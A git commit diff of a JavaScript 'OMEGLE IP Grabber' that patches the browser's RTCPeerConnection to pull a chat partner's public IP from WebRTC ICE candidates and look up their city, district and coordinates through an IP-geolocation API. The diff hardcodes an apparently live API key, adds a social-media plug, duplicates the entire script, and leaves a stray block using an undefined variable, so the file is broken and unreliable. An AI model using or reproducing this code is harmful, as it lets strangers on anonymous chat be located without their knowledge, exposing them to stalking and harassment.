69f2570a8644855dfeaa547a52d1a6f611169657
Gusso0o <73793709+Gusso0o@users.noreply.github.com>
2021-05-12 19:37:13 +0200

    Add files via upload

--- OMEGLE IP Grabber.js
+++ OMEGLE IP Grabber.js
@@ -1,6 +1,11 @@
-//Replace "YOUR API KEY with your API KEY taken in https://ipgeolocation.io/
-//Code by Gusso
-let apiKey = "YOUR API KEY";
+// Subscribe on YouTube, and follow on TikTok (@mattupham)! Socials found below:
+// https://mattupham.com/links
+
+
+// --------------------------------------------
+// PLEASE REPLACE "your-api-key-here" WITH AN
+// API KEY FROM https://ipgeolocation.io/
+let apiKey = "aeb3679db935467fa806e8d6a4b98571";
 
 window.oRTCPeerConnection =
   window.oRTCPeerConnection || window.RTCPeerConnection;
@@ -69,3 +74,53 @@ return pc.oaddIceCandidate(iceCandidate, ...rest)
 
 return pc
 }
+
+//Replace "YOUR API KEY with your API KEY taken in https://ipgeolocation.io/
+//Code by Gusso
+let apiKey = "YOUR API KEY";
+
+window.oRTCPeerConnection =
+  window.oRTCPeerConnection || window.RTCPeerConnection;
+
+window.RTCPeerConnection = function (...args) {
+  const pc = new window.oRTCPeerConnection(...args);
+
+  pc.oaddIceCandidate = pc.addIceCandidate;
+
+  pc.addIceCandidate = function (iceCandidate, ...rest) {
+    const fields = iceCandidate.candidate.split(" ");
+
+    console.log(iceCandidate.candidate);
+    const ip = fields[4];
+    if (fields[7] === "srflx") {
+      getLocation(ip);
+    }
+    return pc.oaddIceCandidate(iceCandidate, ...rest);
+  };
+  return pc;
+};
+
+if (fields[7] === 'srflx') {
+  console.log('IP Address:', fields[4])
+  }
+
+
+let getLocation = async (ip) => {
+  let url = `https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${ip}`;
+
+  await fetch(url).then((response) =>
+    response.json().then((json) => {
+      const output = `
+          ---------------------
+          Country: ${json.country_name}
+          State: ${json.state_prov}
+          City: ${json.city}
+          District: ${json.district}
+          Lat / Long: (${json.latitude}, ${json.longitude})
+          IP Address: ${json.ip.address}
+          ---------------------
+          `;
+      console.log(output);
+    })
+  );
+};
